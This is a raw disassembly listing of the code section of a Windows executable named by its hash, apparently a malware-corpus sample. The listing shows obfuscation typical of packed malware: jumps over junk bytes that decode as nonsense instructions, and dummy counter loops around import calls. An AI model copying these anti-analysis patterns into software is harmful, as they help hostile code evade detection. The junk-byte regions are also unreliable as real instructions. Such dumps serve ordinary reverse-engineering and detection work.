
2507d04e0de1bf65f9bcf071a690a7890818235b896ece4f74e4676d24b9654f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x4335db
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x433673,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x433627
  401023:	or     DWORD PTR ds:0x4335d3,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x4335c3,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [esi+0x7cb5712f],edx
  40104c:	jl     0x4010ca
  40104e:	jl     0x4010b7
  401050:	jle    0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(0)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    eax,DWORD PTR [edx]
  401060:	add    BYTE PTR [edx],al
  401062:	rdpmc  
  401064:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0x313c:0x727fa6ce
  4010ff:	xor    BYTE PTR [ecx-0x60],0xc7
  401103:	outs   dx,BYTE PTR ds:[esi]
  401104:	mov    edi,0x1ea64443
  401109:	pop    edi
  40110a:	inc    edi
  40110b:	enter  0x454a,0xeb
  40110f:	fistp  WORD PTR [edi+0x728444d4]
  401115:	adc    ah,bl
  401117:	lea    eax,[ecx+ecx*2+0x51]
  40111b:	sub    al,0x53
  40111d:	sub    DWORD PTR [esi+eax*1-0x3836479d],esi
  401124:	mov    dl,BYTE PTR [esi]
  401126:	neg    DWORD PTR [ebp+0xaa0dd7d]
  40112c:	not    al
  40112e:	inc    eax
  40112f:	add    cl,BYTE PTR [edi]
  401131:	popf   
  401132:	data16 int3 
  401134:	call   0x79a2:0xc285b862
  40113b:	sbb    esi,DWORD PTR [ebx-0x70f504ed]
  401141:	bswap  esp
  401143:	add    eax,0x93955762
  401148:	jb     0x401169
  40114a:	push   ds
  40114b:	js     0x401153
  40114d:	jns    0x401104
  40114f:	mov    ch,0xbd
  401151:	lea    ebp,[edi+0x37]
  401154:	inc    eax
  401155:	or     eax,0x70c4523c
  40115a:	cmp    bl,ah
  40115c:	imul   esi,esp,0xa2e82a5c
  401162:	jns    0x4010f4
  401164:	xor    BYTE PTR [esi+eiz*2],ch
  401167:	push   ss
  401168:	sub    DWORD PTR [edi],ebx
  40116a:	jp     0x4011b6
  40116c:	mov    ebx,0xfda464d2
  401171:	out    0x83,al
  401173:	(bad)  
  401174:	or     al,0x2b
  401176:	jo     0x4011f2
  401178:	dec    ecx
  401179:	xor    bh,BYTE PTR [edi+0x13]
  40117c:	test   eax,0x6dc84b69
  401181:	out    0x4b,eax
  401183:	jmp    0x40110c
  401185:	in     eax,0xb0
  401187:	fisub  DWORD PTR ds:0xa2f99f1c
  40118d:	push   0x78ee0678
  401192:	addr16 mov ds:0xa1ba,al
  401196:	test   eax,0xbd790801
  40119b:	push   eax
  40119c:	sbb    al,0xe
  40119e:	inc    BYTE PTR [edx+0x3b]
  4011a1:	jae    0x401124
  4011a3:	adc    al,0xb
  4011a5:	and    eax,0x5b42f212
  4011aa:	jp     0x4011fd
  4011ac:	jge    0x4011e1
  4011ae:	jl     0x40119e
  4011b0:	es es inc ecx
  4011b3:	in     al,dx
  4011b4:	or     BYTE PTR [ebp+0x2fba4c31],0x77
  4011bb:	(bad)  
  4011bd:	clc    
  4011be:	mov    al,0x78
  4011c0:	or     esp,esp
  4011c2:	xchg   ebx,eax
  4011c3:	pop    ebx
  4011c4:	cmp    bh,ch
  4011c6:	retf   
  4011c7:	xchg   ebx,eax
  4011c8:	or     ebp,edi
  4011ca:	test   eax,0x2dca3ea0
  4011cf:	cli    
  4011d0:	xchg   esp,eax
  4011d1:	dec    ebp
  4011d2:	out    dx,al
  4011d3:	adc    eax,0x7eb50797
  4011d8:	sbb    esp,DWORD PTR [eax-0x6c]
  4011db:	adc    DWORD PTR ds:0xe8930727,0x2a
  4011e2:	jecxz  0x4011d8
  4011e4:	mov    edx,0x952e5209
  4011e9:	(bad)  
  4011ea:	fsub   st(7),st
  4011ec:	mov    edi,0x3cbf5436
  4011f1:	pop    ecx
  4011f2:	inc    ebx
  4011f3:	push   edi
  4011f4:	jp     0x40122b
  4011f6:	cmp    bl,BYTE PTR [ebx+0x632e3723]
  4011fc:	inc    edi
  4011fd:	std    
  4011fe:	cdq    
  4011ff:	out    dx,al
  401200:	pop    eax
  401201:	cli    
  401202:	jmp    0x579e5655
  401207:	scas   eax,DWORD PTR es:[edi]
  401208:	inc    esi
  401209:	xchg   edi,eax
  40120a:	or     eax,0x76eb013a
  40120f:	aaa    
  401210:	data16 in al,dx
  401212:	ja     0x4011d0
  401214:	mov    edx,0xacd32cc4
  401219:	in     al,0x8e
  40121b:	jo     0x4011c3
  40121d:	enter  0x905a,0xd8
  401221:	mov    ecx,0xc1dc0a21
  401226:	sbb    BYTE PTR [edx],dh
  401228:	add    DWORD PTR [ebx-0x29f839a6],edi
  40122e:	(bad)  
  401230:	push   edx
  401231:	bound  ebp,QWORD PTR [esi-0x80]
  401234:	outs   dx,BYTE PTR ds:[esi]
  401235:	cmp    al,0x7a
  401237:	push   ebx
  401238:	add    eax,DWORD PTR [eax+0x6e4b0aea]
  40123e:	ror    DWORD PTR [esi+0x6aa80969],cl
  401244:	rol    DWORD PTR [edi-0x53],0xba
  401248:	lods   al,BYTE PTR ds:[esi]
  401249:	scas   al,BYTE PTR es:[edi]
  40124a:	jo     0x401288
  40124c:	inc    ecx
  40124d:	xchg   BYTE PTR [ebx+ebx*8-0x26],al
  401251:	xor    BYTE PTR [ebx-0x2caaf9a0],bl
  401257:	in     al,dx
  401258:	xor    DWORD PTR [ecx],edx
  40125a:	push   ebx
  40125b:	jno    0x40124b
  40125d:	cmp    BYTE PTR [edx+0x7028c963],dh
  401263:	mov    ch,0x3c
  401265:	sub    ch,BYTE PTR [ebp+0x67]
  401268:	pop    ss
  401269:	mov    al,0xce
  40126b:	xor    edi,esp
  40126d:	mov    eax,ds:0x3624e0be
  401272:	push   es
  401273:	dec    ebp
  401274:	aas    
  401275:	mov    ebx,0x3230786f
  40127a:	pop    ebp
  40127b:	jae    0x401289
  40127d:	sub    eax,0x35662c75
  401282:	mov    bh,0xcd
  401284:	xchg   ebx,eax
  401285:	idiv   DWORD PTR [edx]
  401287:	sub    al,0xc8
  401289:	and    bh,BYTE PTR [ecx+edx*1-0x9]
  40128d:	clc    
  40128e:	ss push ecx
  401290:	jno    0x401254
  401292:	cmp    dh,BYTE PTR [edx+ecx*2]
  401295:	adc    ecx,ebp
  401297:	pusha  
  401298:	jmp    0x254b:0x13ce01ef
  40129f:	add    DWORD PTR [edi+0x5e],0xdc13eaaf
  4012a6:	xchg   ebp,eax
  4012a7:	imul   bl
  4012a9:	pusha  
  4012aa:	cld    
  4012ab:	lods   eax,DWORD PTR ds:[esi]
  4012ac:	(bad)  
  4012ad:	sub    al,0x36
  4012af:	jne    0x4012a1
  4012b1:	test   al,0x97
  4012b3:	lods   al,BYTE PTR ds:[esi]
  4012b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012b5:	out    dx,eax
  4012b6:	rol    eax,1
  4012b8:	adc    eax,0x47453645
  4012bd:	loope  0x40126f
  4012bf:	push   ebp
  4012c0:	xchg   DWORD PTR [ebp+0x14],esi
  4012c3:	out    0xef,ax
  4012c6:	(bad)  
  4012c8:	and    BYTE PTR [eax-0xcba33f8],0xf7
  4012cf:	aaa    
  4012d0:	sbb    eax,edx
  4012d2:	jmp    0x6f12fe12
  4012d7:	loope  0x401344
  4012d9:	retf   
  4012da:	push   ss
  4012db:	stc    
  4012dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012dd:	ret    0x7a40
  4012e0:	or     cl,0x43
  4012e3:	rol    BYTE PTR [ebp-0x19],cl
  4012e6:	into   
  4012e7:	cmp    eax,0x446a928a
  4012ec:	sbb    ah,BYTE PTR [esp+edi*2]
  4012ef:	(bad)  
  4012f0:	test   eax,0xf41affbd
  4012f5:	aas    
  4012f6:	mov    fs,ecx
  4012f8:	pop    ebx
  4012f9:	daa    
  4012fa:	adc    BYTE PTR gs:[esp+ebx*2-0x80],dl
  4012ff:	out    dx,al
  401300:	xchg   DWORD PTR [ebp-0x3d],ebp
  401303:	popa   
  401304:	pop    edx
  401305:	mov    bl,0x87
  401307:	out    dx,eax
  401308:	adc    bh,BYTE PTR [eax+0x3ff36cbf]
  40130e:	dec    esi
  40130f:	iret   
  401310:	cmp    eax,0xd05a94f7
  401315:	repnz xor al,0xaa
  401318:	mov    WORD PTR [ecx+ecx*8+0x6c356c2f],?
  40131f:	jg     0x4012c4
  401321:	or     DWORD PTR [esi],esp
  401323:	or     BYTE PTR [esi+0x9],dh
  401326:	cmp    al,0x6
  401328:	addr16 xchg edi,eax
  40132a:	pop    ds
  40132b:	push   esi
  40132c:	mov    bl,0x76
  40132e:	and    dl,BYTE PTR [ebx]
  401330:	mov    ah,0x75
  401332:	clc    
  401333:	or     bh,BYTE PTR [esi]
  401335:	pop    ebx
  401336:	mov    dh,0x56
  401338:	test   DWORD PTR [ebx],edx
  40133a:	call   0x4d8b:0x8458b0d
  401341:	clc    
  401342:	push   ebx
  401343:	or     DWORD PTR ds:0x433627,edx
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43361b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43369f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43369f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43369f,ebx
  401379:	cmp    DWORD PTR ds:0x43369f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43369f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x4335e3,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43361f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433617,0x19
  4013f7:	cmp    DWORD PTR ds:0x433617,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433617,0xb
  40140b:	jne    0x401421
  401411:	push   0x4335d3
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433617,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433617
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433617,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433617
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433617,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x4335cf,0x4335c3
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x4335d3,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43369b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43369b
  40148e:	inc    eax
  40148f:	mov    ds:0x43369b,eax
  401494:	cmp    DWORD PTR ds:0x43369b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43369b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43369b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43369b,eax
  4014c4:	cmp    DWORD PTR ds:0x43369b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x43365f,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x4335db
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x4335cf,0x43361f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	nop
  401513:	mov    eax,0x7e6768b9
  401518:	jl     0x401596
  40151a:	addr16 jle 0x401599
  40151d:	jl     0x401584
  40151f:	daa    
  401520:	xor    BYTE PTR [eax],dh
  401522:	sti    
  401523:	adc    eax,esi
  401525:	pop    ecx
  401526:	outs   dx,BYTE PTR ds:[esi]
  401527:	das    
  401528:	jae    0x401525
  40152a:	stc    
  40152b:	mov    eax,DWORD PTR [ebp+ebp*1-0x7d]
  40152f:	retf   0xf7a7
  401532:	outs   dx,BYTE PTR ds:[esi]
  401533:	sub    BYTE PTR [ebx-0x5a16605],bh
  401539:	repnz fnsave [ebx+0x4e]
  40153d:	mov    edx,0x331f30fc
  401542:	fidiv  DWORD PTR [ebp-0x59]
  401545:	ret    
  401546:	ret    0x4d3d
  401549:	sub    DWORD PTR [edi-0x70],ebp
  40154c:	out    0x19,eax
  40154e:	inc    esp
  40154f:	shl    BYTE PTR ds:0x799b08d4,1
  401555:	ror    DWORD PTR [esp+eax*8],0xc9
  401559:	aad    0xd8
  40155b:	pushf  
  40155c:	add    al,0x5c
  40155e:	std    
  40155f:	sub    eax,0x778b1f10
  401564:	cmp    BYTE PTR [eax-0x622607e5],ch
  40156a:	xor    al,0x8a
  40156c:	xor    al,0x3f
  40156e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40156f:	mov    edx,fs
  401571:	scas   eax,DWORD PTR es:[edi]
  401572:	paddsb mm7,QWORD PTR [edi+0x6]
  401576:	test   esp,ecx
  401578:	inc    ecx
  401579:	jno    0x40151b
  40157b:	jo     0x4015ce
  40157d:	leave  
  40157e:	xor    BYTE PTR [ecx],bh
  401580:	and    al,0x7b
  401582:	idiv   BYTE PTR [ebx-0x387c601d]
  401588:	(bad)  
  401589:	pop    ss
  40158a:	and    bh,dh
  40158c:	xchg   ecx,eax
  40158d:	stc    
  40158e:	rol    DWORD PTR [ebx+edx*4+0x360480a7],cl
  401595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401596:	pop    esp
  401597:	sbb    eax,0xa33c9638
  40159c:	pop    ds
  40159d:	iret   
  40159e:	mov    ebp,0x81183079
  4015a3:	push   ecx
  4015a4:	les    ebx,FWORD PTR [esi+edx*1+0x71e0d9b2]
  4015ab:	push   0x808abb8f
  4015b0:	lea    esp,[ebx]
  4015b2:	add    BYTE PTR [ecx-0x4f],cl
  4015b5:	jno    0x40156c
  4015b7:	or     eax,ebx
  4015b9:	add    eax,DWORD PTR [ebp-0xd372777]
  4015bf:	(bad)  
  4015c0:	push   edx
  4015c1:	test   BYTE PTR [edx-0x11d028dd],cl
  4015c7:	lahf   
  4015c8:	push   sp
  4015ca:	fdiv   DWORD PTR [eax+0x56a274a6]
  4015d0:	xchg   edi,eax
  4015d1:	mov    BYTE PTR [eax+0x46],0x57
  4015d5:	in     eax,0xdf
  4015d7:	dec    ebx
  4015d8:	rol    DWORD PTR [ebx-0x5b36da20],1
  4015de:	fsubr  DWORD PTR [ecx-0x18aa8782]
  4015e4:	add    al,0x6
  4015e6:	(bad)  
  4015e7:	imul   edx,DWORD PTR [ecx+ecx*2],0xffffff84
  4015eb:	mov    bl,0xfd
  4015ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015ee:	cli    
  4015ef:	xor    al,ch
  4015f1:	test   eax,0x8be81d50
  4015f6:	xchg   ebx,eax
  4015f7:	(bad)  
  4015f8:	fst    DWORD PTR ds:0xc116edac
  4015fe:	ins    DWORD PTR es:[edi],dx
  4015ff:	fdivr  DWORD PTR [ebp-0x55]
  401602:	je     0x4015cb
  401604:	adc    edi,DWORD PTR [esi-0x6e7e30f4]
  40160a:	in     al,0x8a
  40160c:	data16 ins BYTE PTR es:[edi],dx
  40160e:	call   0xd9bf:0xabe49fb3
  401615:	jbe    0x401652
  401617:	mov    al,ds:0x4494ef31
  40161c:	and    al,cl
  40161e:	pop    ebp
  40161f:	jp     0x401609
  401621:	ins    DWORD PTR es:[edi],dx
  401622:	stos   BYTE PTR es:[edi],al
  401623:	out    dx,eax
  401624:	pusha  
  401625:	in     al,dx
  401626:	jmp    0x29fd2505
  40162b:	inc    edi
  40162c:	outs   dx,BYTE PTR ds:[esi]
  40162d:	or     BYTE PTR [ebp-0x2f911a6c],ch
  401633:	mov    eax,ds:0x3a206ad2
  401638:	jb     0x4016ac
  40163a:	pop    ss
  40163b:	add    eax,DWORD PTR [esi]
  40163d:	jmp    0x1ed6dbf5
  401642:	lods   eax,DWORD PTR ds:[esi]
  401643:	xor    eax,0x1f0f8e50
  401648:	ror    ch,cl
  40164a:	lock data16 jb 0x40161e
  40164e:	mov    edi,0x526960f2
  401653:	add    BYTE PTR [edx+0x2f],al
  401656:	push   esp
  401657:	mov    eax,DWORD PTR [ecx+0x44]
  40165a:	and    al,0xac
  40165c:	std    
  40165d:	ins    BYTE PTR es:[edi],dx
  40165e:	fsubr  DWORD PTR [esi-0x53]
  401661:	xchg   DWORD PTR [ecx-0x11],ecx
  401664:	cmovnp ebp,DWORD PTR [ebp-0x57061cbf]
  40166b:	add    eax,0x2589b1a1
  401670:	push   0xfffffff7
  401672:	sub    edi,DWORD PTR [ecx]
  401674:	adc    DWORD PTR [ebx+0x3713fceb],esi
  40167a:	aam    0xa7
  40167c:	and    BYTE PTR [edx+0x2b],bh
  40167f:	pop    ss
  401680:	and    bh,bh
  401682:	shl    BYTE PTR [ebx+0x7de26e0a],0x69
  401689:	xchg   ebx,eax
  40168a:	mov    dl,0xb7
  40168c:	inc    ebp
  40168d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40168e:	xor    al,0x59
  401690:	mov    DWORD PTR [ecx],esp
  401692:	inc    DWORD PTR [ebx-0x2d]
  401695:	icebp  
  401696:	push   ds
  401697:	xchg   ebx,eax
  401698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401699:	popf   
  40169a:	sbb    eax,0xc590e222
  40169f:	adc    DWORD PTR [eax+eax*8+0x5764cd0d],0x4
  4016a7:	cmc    
  4016a8:	xor    ax,cx
  4016ab:	outs   dx,DWORD PTR ds:[esi]
  4016ac:	mov    bl,0x4e
  4016ae:	in     eax,0xba
  4016b0:	clc    
  4016b1:	add    al,0xad
  4016b3:	jmp    0x215169d0
  4016b8:	loope  0x401689
  4016ba:	cld    
  4016bb:	and    eax,0xc164723d
  4016c0:	sub    bh,BYTE PTR [ebx+ebx*4-0x4a0ea3ab]
  4016c7:	mov    esp,0xd202d1ba
  4016cc:	pop    esi
  4016cd:	pop    edi
  4016ce:	mov    WORD PTR [edi+0x55a46ddf],gs
  4016d4:	xlat   BYTE PTR ds:[ebx]
  4016d5:	ficomp DWORD PTR [edi]
  4016d7:	mov    ecx,0x8b022d43
  4016dc:	and    DWORD PTR [ebx],ebp
  4016de:	in     eax,0xe
  4016e0:	mov    WORD PTR [ecx],?
  4016e2:	jnp    0x4016c6
  4016e4:	jle    0x401709
  4016e6:	push   es
  4016e7:	sbb    ebx,DWORD PTR [ebp+edi*2+0x54]
  4016eb:	push   ecx
  4016ec:	retf   0x79c2
  4016ef:	cmp    al,0xea
  4016f1:	adc    eax,0x8f3fecdd
  4016f6:	xchg   esi,eax
  4016f7:	and    ah,BYTE PTR [edx]
  4016f9:	sub    eax,0xf449f418
  4016fe:	cmc    
  4016ff:	xchg   edx,eax
  401700:	fisttp QWORD PTR [esi+0x12]
  401703:	sub    dh,bl
  401705:	xchg   BYTE PTR ds:[edi+0x100013dd],bl
  40170c:	sub    esi,0x270cf2bf
  401712:	push   cs
  401713:	jp     0x4016a5
  401715:	and    al,0x31
  401717:	ret    
  401718:	lea    ecx,ds:0x87239bf6
  40171e:	in     eax,0x38
  401720:	mov    ch,0xdf
  401722:	dec    edx
  401723:	adc    BYTE PTR [eax-0x7a85b755],0xd
  40172a:	aad    0xc9
  40172c:	dec    ecx
  40172d:	pushaw 
  40172f:	jl     0x4017a3
  401731:	hlt    
  401732:	sub    eax,0x221120f6
  401737:	sub    DWORD PTR [esi+0x6a7b366b],0xffffffcb
  40173e:	fistp  WORD PTR [ecx-0x780de08e]
  401744:	xchg   DWORD PTR [eax],edi
  401746:	pop    ds
  401747:	stos   DWORD PTR es:[edi],eax
  401748:	inc    ecx
  401749:	retf   
  40174a:	xor    BYTE PTR [esi-0x13],ah
  40174d:	push   esi
  40174e:	jecxz  0x40176b
  401750:	and    al,bh
  401752:	out    0xb5,al
  401754:	in     al,0x24
  401756:	dec    ebp
  401757:	into   
  401758:	xchg   ecx,eax
  401759:	mov    eax,ds:0xa47c220b
  40175e:	push   esp
  40175f:	ja     0x4017d3
  401761:	rol    BYTE PTR [edi+ecx*2-0x48c8680e],cl
  401768:	stos   BYTE PTR es:[edi],al
  401769:	nop
  40176a:	mov    esi,DWORD PTR [ecx]
  40176c:	mov    dh,0xa0
  40176e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401770:	push   ebp
  401771:	fld    DWORD PTR [eax]
  401773:	xchg   ebx,eax
  401774:	bound  ecx,QWORD PTR [ebp+esi*4+0x16]
  401778:	(bad)  
  401779:	stos   DWORD PTR es:[edi],eax
  40177a:	imul   eax,edi,0xffffffaf
  40177d:	ret    0x862c
  401780:	pop    ecx
  401781:	pop    ds
  401782:	std    
  401783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401784:	loop   0x401769
  401786:	pop    esi
  401787:	ss jno 0x4017a0
  40178a:	hlt    
  40178b:	and    ch,BYTE PTR [edi-0x76]
  40178e:	xor    dh,BYTE PTR [edx]
  401790:	or     DWORD PTR [eax+ebp*1],0xffffff8f
  401794:	sbb    al,0xe1
  401796:	imul   edi,DWORD PTR [edi],0x41d77100
  40179c:	shl    DWORD PTR [eax+0x69],cl
  40179f:	sub    ebp,DWORD PTR [ecx+0x74]
  4017a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017a3:	inc    esp
  4017a4:	cmp    eax,0x2d0f7812
  4017a9:	lods   eax,DWORD PTR ds:[esi]
  4017aa:	scas   eax,DWORD PTR es:[edi]
  4017ab:	push   cs
  4017ac:	push   esp
  4017ad:	clc    
  4017ae:	test   DWORD PTR [edx],esi
  4017b0:	adc    eax,0xdff99657
  4017b5:	ror    BYTE PTR [eax+0xf],1
  4017b8:	mov    eax,ds:0xb735a918
  4017bd:	push   0xffffff95
  4017bf:	jbe    0x401823
  4017c1:	ror    DWORD PTR [edx-0x63],cl
  4017c4:	sub    al,0x43
  4017c6:	pmaddwd mm3,QWORD PTR [esp+ebp*2]
  4017ca:	jmp    0xf0bf:0xa73e05e7
  4017d1:	add    al,0xd6
  4017d3:	sbb    al,0x67
  4017d5:	mov    dl,0xbc
  4017d7:	int3   
  4017d8:	mov    edi,0xae1c5ed8
  4017dd:	push   0xffffffdc
  4017df:	shl    cl,1
  4017e1:	cmp    edi,DWORD PTR [eax]
  4017e3:	inc    ebp
  4017e4:	cmp    al,0xc3
  4017e6:	push   cs
  4017e7:	push   esi
  4017e8:	jmp    0x5c97:0xa347aab1
  4017ef:	sahf   
  4017f0:	sub    al,0x82
  4017f2:	rcr    BYTE PTR [edx+0x12477cbf],cl
  4017f8:	loopne 0x40182c
  4017fa:	dec    edi
  4017fb:	push   ss
  4017fc:	lahf   
  4017fd:	and    dh,BYTE PTR [edx]
  4017ff:	jb     0x401817
  401801:	sub    eax,0xd73838dc
  401806:	sbb    al,0x3
  401808:	or     BYTE PTR [ecx+0x4336d7],ah
  40180e:	add    DWORD PTR ds:0x4335cb,eax
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43361b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43361b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x4335e3,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x4336af,0x433697
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x43362b
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x433667,0x18
  401872:	cmp    DWORD PTR ds:0x433667,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x433667,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x433667
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x433667,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433697,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433697
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433697,edx
  4018db:	cmp    DWORD PTR ds:0x433697,0x15
  4018e2:	jae    0x401910
  4018e8:	cmp    DWORD PTR ds:0x433697,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x4336ef
  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
